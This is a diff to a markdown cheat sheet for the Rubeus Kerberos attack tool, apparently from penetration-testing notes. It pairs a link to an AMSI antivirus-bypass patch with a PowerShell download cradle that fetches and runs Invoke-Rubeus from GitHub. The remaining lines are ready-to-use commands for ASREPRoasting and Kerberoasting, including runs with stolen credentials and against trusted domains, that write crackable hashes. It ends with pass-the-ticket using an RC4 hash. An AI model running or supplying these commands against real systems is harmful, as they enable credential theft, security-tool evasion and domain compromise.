@@ -1,8 +1,9 @@
-# Reference
+# References
 - [Rubeus](https://github.com/GhostPack/Rubeus)
 
 # Add to PowerShell
-- [Patch amsi.dll](https://github.com/okazymyrov/piki/blob/master/PowerShell.md#patching-amsidll-amsiscanbuffer-by-rasta-mouse)
+> **Warning**
+> [Patch amsi.dll](https://github.com/okazymyrov/piki/blob/master/PowerShell.md#patching-amsidll-amsiscanbuffer-by-rasta-mouse)
 ```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/okazymyrov/piki/master/Invoke-Rubeus.ps1')
@@ -10,17 +11,33 @@ iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 
 # Commands
 
-## Kerberoast for the current domain
+## ASREPRoast with specified credentials
 ```powershell
-Invoke-Rubeus 'kerberoast /outfile:hashes.<domain>.txt /format:hashcat'
+Invoke-Rubeus 'asreproast /outfile:asreproast.<domain>.txt /format:hashcat /creduser:<domain>.local\<user> /credpassword:<pass> /dc:<dc> /domain:<domain>'
 ```
 
-## Kerberoast for a trusted domain
+## Kerberoast
+### Kerberoast for the current domain
 ```powershell
-Invoke-Rubeus 'kerberoast /outfile:hashes.<domain>.txt /format:hashcat /domain:<trusted domain> /dc:<trusted DC>'
+Invoke-Rubeus 'kerberoast /outfile:kerberoast.<domain>.txt /format:hashcat'
 ```
 
-## Reqest and pass the ticket to the current session
+### Kerberoast for a trusted domain
+```powershell
+Invoke-Rubeus 'kerberoast /outfile:kerberoast.<domain>.txt /format:hashcat /domain:<trusted domain> /dc:<trusted DC>'
+```
+
+### Kerberoast from non-joined domain machine
+```powershell
+Invoke-Rubeus 'kerberoast /outfile:kerberoast.<domain>.txt /format:hashcat /creduser:<domain.local>\<user> /credpassword:<pass> /dc:<dc> /domain:<domain>'
+```
+
+### List statistics about found Kerberoastable accounts without actually sending ticket requests
+```powershell
+Invoke-Rubeus 'kerberoast /stats /creduser:<domain>.local\<user> /credpassword:<pass> /dc:<dc> /domain:<domain>'
+```
+
+## Reqest and pass a TGT ticket to the current session
 ```powershell
 Invoke-Rubeus 'asktgt /user:<user> /rc4:<hash> /domain:<domain> /ptt'
 ```
